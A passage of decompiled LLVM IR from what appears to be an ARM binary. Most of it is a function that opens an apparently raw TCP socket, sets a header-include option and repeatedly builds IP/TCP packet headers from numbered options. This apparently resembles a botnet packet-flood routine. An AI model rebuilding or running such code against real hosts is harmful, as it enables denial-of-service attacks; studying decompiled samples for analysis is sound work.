  uselistorder i32 %v1_a40c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a3f8, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_a384, { 1, 0 }
  uselistorder i32 %v6_a37c, { 0, 2, 1, 3 }
  uselistorder i1 %v9_a3ac, { 1, 0 }
  uselistorder i32 %v4_a3c0, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_a308, { 1, 0, 2 }
  uselistorder i32 %v0_a4b8, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_a2f8, { 1, 0 }
  uselistorder i1 %v7_a2f0, { 1, 0, 2 }
  uselistorder i1 %v7_a2a4, { 1, 0 }
  uselistorder i32 %v3_a2a0, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_a680, { 1, 0 }
  uselistorder i32 %v1_a668, { 1, 0 }
  uselistorder i32 %v1_a650, { 1, 0 }
  uselistorder i32 %v1_a638, { 1, 0 }
  uselistorder i32 %v1_a620, { 1, 0 }
  uselistorder i32 %v3_a3b8, { 1, 0 }
  uselistorder i1 %v2_a3d4, { 1, 0 }
  uselistorder i32 %v1_a3d0, { 1, 0 }
  uselistorder i32 %v4_a3cc, { 2, 0, 1 }
  uselistorder i32 %v2_a2e0, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_a27c, { 1, 0 }
  uselistorder i1 %v7_a274, { 1, 0 }
  uselistorder i1 %v7_a248, { 1, 0 }
  uselistorder i32 %v3_a244, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_a230, { 2, 3, 1, 0 }
  uselistorder i32 %v6_a210, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_a1f8, { 1, 2, 0 }
  uselistorder i32 %v1_a1d8, { 1, 2, 0 }
  uselistorder i32 %v1_a1b8, { 1, 2, 0 }
  uselistorder i32 %v1_a198, { 1, 2, 0 }
  uselistorder i32 %v1_a178, { 1, 2, 0 }
  uselistorder i32 %v1_a158, { 1, 2, 0 }
  uselistorder i32 %v6_a134, { 1, 0 }
  uselistorder i32 %v1_a11c, { 1, 2, 0 }
  uselistorder i32 %v6_a0b4, { 2, 1, 3, 0 }
  uselistorder i32 %v2_a09c, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_a08c, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 49, 48, 50, 52, 51, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a718, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a6ec, { 1, 0 }
  uselistorder label %dec_label_pc_a6dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a6cc, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_a438, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a408, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a344, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_a324, { 1, 0 }
  uselistorder label %dec_label_pc_a300, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_a2b0, { 1, 0 }
  uselistorder label %dec_label_pc_a294, { 1, 0 }
}

define i32 @function_a824(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a824:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_a824 = load i32, i32* @sb, align 4
  %v24_a824 = load i32, i32* @fp, align 4
  %v27_a824 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_a840 = call i32 @function_1215c(i32 %arg1, i32 4)
  %v0_a844 = load i32, i32* @r5, align 4
  store i32 %v0_a844, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a854 = load i32, i32* @r4, align 4
  store i32 %v0_a854, i32* %r0.global-to-local, align 4
  %v5_a858 = inttoptr i32 %v0_a844 to i32*
  %v6_a858 = call i32 @function_8570(i32 %v0_a854, i32* %v5_a858, i32 2, i32 0, i32 %v2_a840)
  %v1_a864 = urem i32 %v6_a858, 256
  store i32 %v1_a864, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a870 = load i32, i32* @r5, align 4
  store i32 %v0_a870, i32* %r1.global-to-local, align 4
  %v0_a874 = load i32, i32* @r4, align 4
  store i32 %v0_a874, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_a858, 16777216
  %v5_a87c = sdiv i32 %sext, 16777216
  %v6_a87c = inttoptr i32 %v0_a870 to i32*
  %v7_a87c = call i32 @function_8570(i32 %v0_a874, i32* %v6_a87c, i32 3, i32 65535, i32 %v5_a87c)
  %v0_a880 = load i32, i32* @r5, align 4
  store i32 %v0_a880, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a87c, i32* %sb.global-to-local, align 4
  %v0_a890 = load i32, i32* @r4, align 4
  store i32 %v0_a890, i32* %r0.global-to-local, align 4
  %v5_a894 = inttoptr i32 %v0_a880 to i32*
  %v6_a894 = call i32 @function_8570(i32 %v0_a890, i32* %v5_a894, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_a89c = urem i32 %v6_a894, 256
  store i32 %v1_a89c, i32* %ip.global-to-local, align 4
  %v0_a8a0 = load i32, i32* @r5, align 4
  store i32 %v0_a8a0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a8ac = load i32, i32* @r4, align 4
  store i32 %v0_a8ac, i32* %r0.global-to-local, align 4
  %sext4 = mul i32 %v6_a894, 16777216
  %v5_a8b4 = sdiv i32 %sext4, 16777216
  %v6_a8b4 = inttoptr i32 %v0_a8a0 to i32*
  %v7_a8b4 = call i32 @function_8570(i32 %v0_a8ac, i32* %v6_a8b4, i32 5, i32 0, i32 %v5_a8b4)
  %v1_a8c0 = urem i32 %v7_a8b4, 256
  store i32 %v1_a8c0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a8cc = load i32, i32* @r5, align 4
  store i32 %v0_a8cc, i32* %r1.global-to-local, align 4
  %v0_a8d0 = load i32, i32* @r4, align 4
  store i32 %v0_a8d0, i32* %r0.global-to-local, align 4
  %v5_a8d8 = inttoptr i32 %v0_a8cc to i32*
  %v6_a8d8 = call i32 @function_8570(i32 %v0_a8d0, i32* %v5_a8d8, i32 6, i32 65535, i32 %v1_a8c0)
  %v0_a8e0 = load i32, i32* @r5, align 4
  store i32 %v0_a8e0, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_a8d8, i32* @r6, align 4
  %v0_a8f0 = load i32, i32* @r4, align 4
  store i32 %v0_a8f0, i32* %r0.global-to-local, align 4
  %v5_a8f4 = inttoptr i32 %v0_a8e0 to i32*
  %v6_a8f4 = call i32 @function_8570(i32 %v0_a8f0, i32* %v5_a8f4, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_a8fc = load i32, i32* @r5, align 4
  store i32 %v0_a8fc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_a8f4, i32* @sl, align 4
  %v0_a90c = load i32, i32* @r4, align 4
  store i32 %v0_a90c, i32* %r0.global-to-local, align 4
  %v5_a910 = inttoptr i32 %v0_a8fc to i32*
  %v6_a910 = call i32 @function_8570(i32 %v0_a90c, i32* %v5_a910, i32 17, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_a91c = load i32, i32* @r5, align 4
  store i32 %v0_a91c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_a928 = load i32, i32* @r4, align 4
  store i32 %v0_a928, i32* %r0.global-to-local, align 4
  %v5_a92c = inttoptr i32 %v0_a91c to i32*
  %v6_a92c = call i32 @function_8570(i32 %v0_a928, i32* %v5_a92c, i32 18, i32 65535, i32 %v6_a910)
  %v0_a930 = load i32, i32* @r5, align 4
  store i32 %v0_a930, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a940 = load i32, i32* @r4, align 4
  store i32 %v0_a940, i32* %r0.global-to-local, align 4
  %v5_a944 = inttoptr i32 %v0_a930 to i32*
  %v6_a944 = call i32 @function_8570(i32 %v0_a940, i32* %v5_a944, i32 11, i32 0, i32 %v6_a92c)
  %v0_a948 = load i32, i32* @r5, align 4
  store i32 %v0_a948, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a958 = load i32, i32* @r4, align 4
  store i32 %v0_a958, i32* %r0.global-to-local, align 4
  %v5_a95c = inttoptr i32 %v0_a948 to i32*
  %v6_a95c = call i32 @function_8570(i32 %v0_a958, i32* %v5_a95c, i32 12, i32 1, i32 %v6_a944)
  %v0_a960 = load i32, i32* @r5, align 4
  store i32 %v0_a960, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a970 = load i32, i32* @r4, align 4
  store i32 %v0_a970, i32* %r0.global-to-local, align 4
  %v5_a974 = inttoptr i32 %v0_a960 to i32*
  %v6_a974 = call i32 @function_8570(i32 %v0_a970, i32* %v5_a974, i32 13, i32 0, i32 %v6_a95c)
  %v0_a978 = load i32, i32* @r5, align 4
  store i32 %v0_a978, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a988 = load i32, i32* @r4, align 4
  store i32 %v0_a988, i32* %r0.global-to-local, align 4
  %v5_a98c = inttoptr i32 %v0_a978 to i32*
  %v6_a98c = call i32 @function_8570(i32 %v0_a988, i32* %v5_a98c, i32 14, i32 0, i32 %v6_a974)
  %v0_a990 = load i32, i32* @r5, align 4
  store i32 %v0_a990, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9a0 = load i32, i32* @r4, align 4
  store i32 %v0_a9a0, i32* %r0.global-to-local, align 4
  %v5_a9a4 = inttoptr i32 %v0_a990 to i32*
  %v6_a9a4 = call i32 @function_8570(i32 %v0_a9a0, i32* %v5_a9a4, i32 15, i32 0, i32 %v6_a98c)
  %v0_a9a8 = load i32, i32* @r5, align 4
  store i32 %v0_a9a8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9b8 = load i32, i32* @r4, align 4
  store i32 %v0_a9b8, i32* %r0.global-to-local, align 4
  %v5_a9bc = inttoptr i32 %v0_a9a8 to i32*
  %v6_a9bc = call i32 @function_8570(i32 %v0_a9b8, i32* %v5_a9bc, i32 16, i32 0, i32 %v6_a9a4)
  %v0_a9c0 = load i32, i32* @r5, align 4
  store i32 %v0_a9c0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_a9d0 = load i32, i32* @r4, align 4
  store i32 %v0_a9d0, i32* %r0.global-to-local, align 4
  %v5_a9d4 = inttoptr i32 %v0_a9c0 to i32*
  %v6_a9d4 = call i32 @function_8570(i32 %v0_a9d0, i32* %v5_a9d4, i32 0, i32 512, i32 %v6_a9bc)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a9e4 = load i32, i32* @r5, align 4
  store i32 %v0_a9e4, i32* %r1.global-to-local, align 4
  %v0_a9e8 = load i32, i32* @r4, align 4
  store i32 %v0_a9e8, i32* %r0.global-to-local, align 4
  %v5_a9ec = inttoptr i32 %v0_a9e4 to i32*
  %v6_a9ec = call i32 @function_8570(i32 %v0_a9e8, i32* %v5_a9ec, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_a9f8 = load i32, i32* @global_var_20a5c.46, align 4
  store i32 %v2_a9f8, i32* %r3.global-to-local, align 4
  %v1_a9fc = urem i32 %v6_a9ec, 256
  store i32 %v1_a9fc, i32* %ip.global-to-local, align 4
  %v0_aa00 = load i32, i32* @r5, align 4
  store i32 %v0_aa00, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_aa08 = load i32, i32* @r4, align 4
  store i32 %v0_aa08, i32* %r0.global-to-local, align 4
  %v5_aa10 = inttoptr i32 %v0_aa00 to i32*
  %v6_aa10 = call i32 @function_8504(i32 %v0_aa08, i32* %v5_aa10, i32 25, i32 %v2_a9f8, i32 %v1_a9fc)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_aa24 = call i32 @function_115f4(i32 2, i32 3, i32 6)
  store i32 %v3_aa24, i32* %r0.global-to-local, align 4
  %v7_aa28 = icmp eq i32 %v3_aa24, -1
  store i1 %v7_aa28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa28, label %dec_label_pc_aef0, label %dec_label_pc_aa34

dec_label_pc_aa34:                                ; preds = %dec_label_pc_a824
  store i32 1, i32* %stack_var_-44, align 4
  %v6_aa3c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_aa3c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_aa50 = call i32 @function_115b0(i32 %v3_aa24, i32 0, i32 3, i32 %v6_aa3c, i32 4)
  store i32 %v5_aa50, i32* %r0.global-to-local, align 4
  %v7_aa54 = icmp eq i32 %v5_aa50, -1
  store i1 %v7_aa54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa54, label %dec_label_pc_aee8, label %dec_label_pc_aa5c

dec_label_pc_aa5c:                                ; preds = %dec_label_pc_aa34
  %v0_aa5c = load i32, i32* %sb.global-to-local, align 4
  %v3_aa5c = mul i32 %v0_aa5c, 65536
  store i32 %v3_aa5c, i32* @r5, align 4
  %v0_aa60 = load i32, i32* @r6, align 4
  %v0_aa64 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_aa6c = urem i32 %v0_aa5c, 65536
  store i32 %v3_aa6c, i32* %r1.global-to-local, align 4
  %v3_aa70 = urem i32 %v0_aa60, 65536
  store i32 %v3_aa70, i32* %r2.global-to-local, align 4
  %v3_aa74 = urem i32 %v0_aa64, 65536
  store i32 %v3_aa74, i32* %r3.global-to-local, align 4
  %v0_aa78 = load i32, i32* @r7, align 4
  %v2_aa78 = icmp eq i32 %v0_aa78, 0
  store i1 %v2_aa78, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_aa78, label %dec_label_pc_aefc, label %dec_label_pc_aa90

dec_label_pc_aa90:                                ; preds = %dec_label_pc_aa5c
  %v3_aa94 = mul i32 %v6_a9d4, 65536
  %v1_aa98 = add i32 %v3_aa94, 2621440
  store i32 %v1_aa98, i32* @lr, align 4
  %tmp59 = mul i32 %v0_aa60, 256
  %v3_aabc = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_aa64, 256
  %v3_aac0 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_aa60, 256
  %v4_aac4 = urem i32 %tmp61, 256
  %v5_aac4 = or i32 %v4_aac4, %v3_aabc
  store i32 %v5_aac4, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_aa64, 256
  %v4_aac8 = urem i32 %tmp62, 256
  %v5_aac8 = or i32 %v4_aac8, %v3_aac0
  store i32 %v5_aac8, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_aa98, 256
  %v3_aadc = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_aa5c, 256
  %v3_aae0 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v6_a910, 256
  %v3_aae4 = and i32 %tmp65, 65280
  %v1_aae8 = urem i32 %v6_a944, 2
  %v1_aaec = urem i32 %v6_a95c, 2
  %tmp66 = udiv i32 %v6_a910, 256
  %v4_aaf0 = urem i32 %tmp66, 256
  %v5_aaf0 = or i32 %v4_aaf0, %v3_aae4
  %v4_aaf4 = udiv i32 %v1_aa98, 16777216
  %v5_aaf4 = or i32 %v3_aadc, %v4_aaf4
  store i32 %v5_aaf4, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_aa5c, 256
  %v4_aaf8 = urem i32 %tmp67, 256
  %v5_aaf8 = or i32 %v4_aaf8, %v3_aae0
  store i32 %v5_aaf8, i32* @fp, align 4
  %v1_ab14 = urem i32 %v6_a974, 2
  store i32 %v1_ab14, i32* %r2.global-to-local, align 4
  %v1_ab18 = urem i32 %v6_a98c, 2
  store i32 %v1_ab18, i32* %r3.global-to-local, align 4
  %v1_ab1c = urem i32 %v6_a9a4, 2
  store i32 %v1_ab1c, i32* %ip.global-to-local, align 4
  %v1_ab20 = urem i32 %v6_a9bc, 2
  store i32 %v1_ab20, i32* %r0.global-to-local, align 4
  %v1_ab24 = urem i32 %v6_a974, 256
  store i32 %v1_ab24, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %tmp = sub nsw i32 0, %v1_aaec
  %v4_ac10 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_ab14
  %v4_ac2c = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_ab18
  %v4_ac40 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_ab1c
  %v3_ac54 = and i32 %tmp74, 2
  %v2_ac78 = icmp eq i32 %v1_ab24, 0
  %v1_aba0 = trunc i32 %v5_a87c to i8
  %extract.t = trunc i32 %v5_a8b4 to i8
  br label %dec_label_pc_ab44

dec_label_pc_ab44:                                ; preds = %bb70, %dec_label_pc_aa90
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ab50 = call i32 @function_1215c(i32 1510, i32 1)
  store i32 %v2_ab50, i32* %r0.global-to-local, align 4
  %v2_ab58 = load i32, i32* @r4, align 4
  %v5_ab58 = mul i32 %v2_ab58, 4
  %v6_ab58 = add i32 %v5_ab58, %v2_a840
  %v7_ab58 = inttoptr i32 %v6_ab58 to i32*
  store i32 %v2_ab50, i32* %v7_ab58, align 4
  %v3_ab5c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ab5c, i32* %r2.global-to-local, align 4
  %v5_ab64 = mul i32 %v3_ab5c, 24
  %v1_ab68 = load i32, i32* @r8, align 4
  %v2_ab68 = add i32 %v1_ab68, %v5_ab64
  store i32 %v2_ab68, i32* %r1.global-to-local, align 4
  store i32 %v2_a840, i32* %r3.global-to-local, align 4
  %v4_ab70 = mul i32 %v3_ab5c, 4
  %v5_ab70 = add i32 %v4_ab70, %v2_a840
  %v6_ab70 = inttoptr i32 %v5_ab70 to i32*
  %v7_ab70 = load i32, i32* %v6_ab70, align 4
  store i32 %v7_ab70, i32* @r5, align 4
  %v1_ab74 = inttoptr i32 %v7_ab70 to i8*
  %v2_ab74 = load i8, i8* %v1_ab74, align 1
  %tmp75 = urem i8 %v2_ab74, 16
  %v1_ab78 = zext i8 %tmp75 to i32
  %v1_ab7c = or i32 %v1_ab78, 64
  store i32 %v1_ab7c, i32* %r3.global-to-local, align 4
  %v1_ab80 = trunc i32 %v1_ab7c to i8
  store i8 %v1_ab80, i8* %v1_ab74, align 1
  %v0_ab84 = load i32, i32* @r5, align 4
  %v1_ab84 = inttoptr i32 %v0_ab84 to i8*
  %v2_ab84 = load i8, i8* %v1_ab84, align 1
  %v1_ab88 = and i8 %v2_ab84, -16
  %v1_ab8c = or i8 %v1_ab88, 5
  store i32 %v1_a8c0, i32* %ip.global-to-local, align 4
  store i8 %v1_ab8c, i8* %v1_ab84, align 1
  store i32 %v5_a87c, i32* %r0.global-to-local, align 4
  %v0_ab9c = load i32, i32* %ip.global-to-local, align 4
  %v2_ab9c = icmp eq i32 %v0_ab9c, 0
  store i1 %v2_ab9c, i1* %cpsr_z.global-to-local, align 1
  %v2_aba0 = load i32, i32* @r5, align 4
  %v3_aba0 = add i32 %v2_aba0, 1
  %v4_aba0 = inttoptr i32 %v3_aba0 to i8*
  store i8 %v1_aba0, i8* %v4_aba0, align 1
  store i32 %v5_a8b4, i32* %r2.global-to-local, align 4
  %v0_aba8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_aba8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_ab44
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_abac = load i32, i32* @r5, align 4
  %v4_abac = add i32 %v3_abac, 6
  %v5_abac = inttoptr i32 %v4_abac to i16*
  store i16 64, i16* %v5_abac, align 2
  %v0_abb4.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_abb4.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_ab44, %bb
  %v0_abb4.off0 = phi i8 [ %extract.t, %dec_label_pc_ab44 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_abb4 = load i32, i32* @r5, align 4
  %v3_abb4 = add i32 %v2_abb4, 8
  %v4_abb4 = inttoptr i32 %v3_abb4 to i8*
  store i8 %v0_abb4.off0, i8* %v4_abb4, align 1
  %v0_abb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_abb8 = trunc i32 %v0_abb8 to i8
  %v2_abb8 = load i32, i32* @r5, align 4
  %v3_abb8 = add i32 %v2_abb8, 9
  %v4_abb8 = inttoptr i32 %v3_abb8 to i8*
  store i8 %v1_abb8, i8* %v4_abb8, align 1
  store i32 %v6_aa10, i32* %ip.global-to-local, align 4
  %v1_abc0 = load i32, i32* @r5, align 4
  %v2_abc0 = add i32 %v1_abc0, 12
  %v3_abc0 = inttoptr i32 %v2_abc0 to i32*
  store i32 %v6_aa10, i32* %v3_abc0, align 4
  %v0_abc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_abc4 = add i32 %v0_abc4, 16
  %v2_abc4 = inttoptr i32 %v1_abc4 to i32*
  %v3_abc4 = load i32, i32* %v2_abc4, align 4
  store i32 %v3_abc4, i32* %r3.global-to-local, align 4
  %v0_abc8 = load i32, i32* @sb, align 4
  %v1_abc8 = trunc i32 %v0_abc8 to i16
  %v2_abc8 = load i32, i32* @r5, align 4
  %v3_abc8 = add i32 %v2_abc8, 2
  %v4_abc8 = inttoptr i32 %v3_abc8 to i16*
  store i16 %v1_abc8, i16* %v4_abc8, align 2
  %v0_abcc = load i32, i32* @fp, align 4
  %v1_abcc = trunc i32 %v0_abcc to i16
  %v2_abcc = load i32, i32* @r5, align 4
  %v3_abcc = add i32 %v2_abcc, 4
  %v4_abcc = inttoptr i32 %v3_abcc to i16*
  store i16 %v1_abcc, i16* %v4_abcc, align 2
  %v0_abd0 = load i32, i32* %r3.global-to-local, align 4
  %v1_abd0 = load i32, i32* @r5, align 4
  %v2_abd0 = add i32 %v1_abd0, 16
  %v3_abd0 = inttoptr i32 %v2_abd0 to i32*
  store i32 %v0_abd0, i32* %v3_abd0, align 4
  %v0_abd4 = load i32, i32* @r6, align 4
  %v1_abd4 = trunc i32 %v0_abd4 to i16
  %v2_abd4 = load i32, i32* @r5, align 4
  %v3_abd4 = add i32 %v2_abd4, 20
  %v4_abd4 = inttoptr i32 %v3_abd4 to i16*
  store i16 %v1_abd4, i16* %v4_abd4, align 2
  %v0_abd8 = load i32, i32* @r5, align 4
  %v1_abd8 = add i32 %v0_abd8, 20
  store i32 %v1_abd8, i32* @r4, align 4
  %v1_abdc = add i32 %v0_abd8, 32
  %v2_abdc = inttoptr i32 %v1_abdc to i8*
  %v3_abdc = load i8, i8* %v2_abdc, align 1
  %v4_abdc = zext i8 %v3_abdc to i32
  store i32 %v4_abdc, i32* %r3.global-to-local, align 4
  %v1_abe0 = add i32 %v0_abd8, 33
  %v2_abe0 = inttoptr i32 %v1_abe0 to i8*
  %v3_abe0 = load i8, i8* %v2_abe0, align 1
  %v4_abe0 = zext i8 %v3_abe0 to i32
  store i32 %v1_aae8, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_abdc, 16
  %v1_abe8 = zext i8 %tmp76 to i32
  %v1_abec = or i32 %v1_abe8, 80
  store i32 %v1_abec, i32* %r3.global-to-local, align 4
  %v1_abf0 = and i32 %v4_abe0, 223
  store i32 %v1_abf0, i32* %r2.global-to-local, align 4
  %v1_abf4 = trunc i32 %v1_abec to i8
  store i8 %v1_abf4, i8* %v2_abdc, align 1
  %v0_abf8 = load i32, i32* %r2.global-to-local, align 4
  %v1_abf8 = load i32, i32* %r0.global-to-local, align 4
  %v4_abf8 = mul i32 %v1_abf8, 32
  %v5_abf8 = or i32 %v4_abf8, %v0_abf8
  store i32 %v5_abf8, i32* %r2.global-to-local, align 4
  store i32 %v5_aaf0, i32* %r1.global-to-local, align 4
  %v1_ac00 = trunc i32 %v5_abf8 to i8
  %v2_ac00 = load i32, i32* @r4, align 4
  %v3_ac00 = add i32 %v2_ac00, 13
  %v4_ac00 = inttoptr i32 %v3_ac00 to i8*
  store i8 %v1_ac00, i8* %v4_ac00, align 1
  %v0_ac04 = load i32, i32* @r4, align 4
  %v1_ac04 = add i32 %v0_ac04, 13
  %v2_ac04 = inttoptr i32 %v1_ac04 to i8*
  %v3_ac04 = load i8, i8* %v2_ac04, align 1
  %v4_ac04 = zext i8 %v3_ac04 to i32
  store i32 %v1_aaec, i32* %r2.global-to-local, align 4
  %v1_ac0c = and i32 %v4_ac04, 239
  %v5_ac10 = or i32 %v1_ac0c, %v4_ac10
  store i32 %v5_ac10, i32* %r3.global-to-local, align 4
  %v0_ac14 = load i32, i32* %r1.global-to-local, align 4
  %v2_ac14 = add i32 %v0_ac04, 4
  %v3_ac14 = inttoptr i32 %v2_ac14 to i32*
  store i32 %v0_ac14, i32* %v3_ac14, align 4
  %v0_ac18 = load i32, i32* @sl, align 4
  %v1_ac18 = trunc i32 %v0_ac18 to i16
  %v2_ac18 = load i32, i32* @r4, align 4
